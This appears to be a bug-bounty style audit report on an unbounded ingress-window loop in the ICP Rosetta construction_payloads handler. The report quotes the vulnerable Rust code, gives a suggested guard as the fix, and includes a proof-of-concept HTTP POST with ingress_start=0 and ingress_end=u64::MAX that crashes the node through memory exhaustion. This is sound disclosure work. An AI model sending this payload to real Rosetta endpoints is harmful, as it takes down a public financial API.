Audit Report

## Title
Unbounded Ingress Window Loop Causes OOM DoS in ICP Rosetta `construction_payloads` - (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

## Summary

The ICP Rosetta `construction_payloads` handler accepts attacker-controlled `ingress_start` and `ingress_end` values from `ConstructionPayloadsRequestMetadata` and feeds them directly into an unbounded `while` loop with no cap on the window size or iteration count. A single unauthenticated HTTP POST with `ingress_start=0` and `ingress_end=u64::MAX` causes the loop to push approximately 153 billion `u64` entries into a heap-allocated `Vec`, exhausting process memory and crashing the Rosetta node. The ICRC1 Rosetta counterpart already contains explicit guards for this exact class of bug; the ICP Rosetta path has no equivalent protection.

## Finding Description

**Interval computation** (`construction_payloads.rs`, lines 59–60):

```rust
let interval =
    ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

With `MAX_INGRESS_TTL = 300s` and `PERMITTED_DRIFT = 60s`, this yields `interval = 120 seconds = 120,000,000,000 ns`.

**Unvalidated attacker input** (lines 74–84): `ingress_start` and `ingress_end` are deserialized from the JSON request body as plain `Option<u64>` fields in `ConstructionPayloadsRequestMetadata` (`models.rs`, lines 199–223) and converted directly to `ic_types::time::Time` with no range or sanity checks.

**Unbounded loop** (lines 99–107):

```rust
let mut ingress_expiries = vec![];
let mut now = ingress_start;
while now < ingress_end {
    let ingress_expiry = (now
        + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
    .as_nanos_since_unix_epoch();
    ingress_expiries.push(ingress_expiry);
    now += interval;
}
```

With `ingress_start=0` and `ingress_end=u64::MAX` (18,446,744,073,709,551,615 ns):

```
iterations ≈ 18_446_744_073_709_551_615 / 120_000_000_000 ≈ 153,722,867,280
memory     ≈ 153 billion × 8 bytes                        ≈ ~1.23 TB
```

The process is killed by the OOM killer long before completion, crashing the Rosetta node.

**Contrast with ICRC1 Rosetta** (`rs/rosetta-api/icrc1/src/construction_api/services.rs`, lines 148–158): the ICRC1 path explicitly rejects requests where `ingress_start >= ingress_end` and where `ingress_end < now + ingress_interval`. The ICP Rosetta path has no analogous check anywhere before the loop executes.

## Impact Explanation

A single small (~100-byte) unauthenticated HTTP POST to the publicly reachable `/construction/payloads` endpoint crashes the ICP Rosetta node process via OOM. The Rosetta API becomes completely unavailable until the process is manually restarted. This is a non-volumetric, single-request application-level DoS against a listed in-scope financial integration component (ICP Rosetta API), matching the allowed High impact: *"Application/platform-level DoS, crash... not based on raw volumetric DDoS"* and *"Significant... Rosetta... security impact with concrete user or protocol harm."*

## Likelihood Explanation

The endpoint is publicly reachable with no authentication required. The exploit requires no credentials, no prior state, and no special knowledge beyond the public Rosetta API schema. The payload is trivially constructable. The ICRC1 counterpart already demonstrates developer awareness of this class of bug, making the omission in the ICP path a clear oversight. The attack is repeatable: every restart of the Rosetta process can be immediately followed by another crash request.

## Recommendation

Add a window-size guard before the loop in `construction_payloads()`, mirroring the ICRC1 implementation in `rs/rosetta-api/icrc1/src/construction_api/services.rs`:

```rust
if ingress_start >= ingress_end {
    return Err(ApiError::internal_error(
        "ingress_start must be before ingress_end",
    ));
}
// Cap the window to a reasonable maximum (e.g., 100 intervals ≈ 2 hours)
let max_window = interval * 100;
if ingress_end > ingress_start + max_window {
    return Err(ApiError::internal_error(
        "ingress_end exceeds maximum allowed window",
    ));
}
```

Alternatively, break out of the loop after pushing a fixed maximum number of entries (e.g., 100) and return an error if the window would exceed it.

## Proof of Concept

```
POST /construction/payloads HTTP/1.1
Content-Type: application/json

{
  "network_identifier": { "blockchain": "Internet Computer", "network": "00000000000000020101" },
  "operations": [
    {
      "operation_identifier": { "index": 0 },
      "type": "TRANSACTION",
      "account": { "address": "<valid_account>" },
      "amount": { "value": "-100000000", "currency": { "symbol": "ICP", "decimals": 8 } }
    },
    {
      "operation_identifier": { "index": 1 },
      "type": "TRANSACTION",
      "account": { "address": "<valid_destination>" },
      "amount": { "value": "100000000", "currency": { "symbol": "ICP", "decimals": 8 } }
    },
    {
      "operation_identifier": { "index": 2 },
      "type": "FEE",
      "account": { "address": "<valid_account>" },
      "amount": { "value": "-10000", "currency": { "symbol": "ICP", "decimals": 8 } }
    }
  ],
  "public_keys": [ { "hex_bytes": "<valid_pubkey_hex>", "curve_type": "edwards25519" } ],
  "metadata": {
    "ingress_start": 0,
    "ingress_end": 18446744073709551615
  }
}
```

This triggers the loop at `construction_payloads.rs` lines 99–107 with ~153 billion iterations. The Rosetta process is killed by the OOM killer. A unit test can confirm the bug by calling `construction_payloads()` directly with these metadata values and observing that it does not return before exhausting memory, or by asserting that a window-size guard (once added) returns an error for this input. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/rosetta-api/icp/src/models.rs (L199-223)
```rust
/// Typed metadata of ConstructionPayloadsRequest.
#[derive(Clone, Eq, PartialEq, Debug, Default, Deserialize, Serialize)]
pub struct ConstructionPayloadsRequestMetadata {
    /// The memo to use for a ledger transfer.
    /// A random number is used by default.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub memo: Option<u64>,

    /// The earliest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_start: Option<u64>,

    /// The latest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_end: Option<u64>,

    /// If present, overrides ledger transaction creation time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub created_at_time: Option<u64>,
}
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```
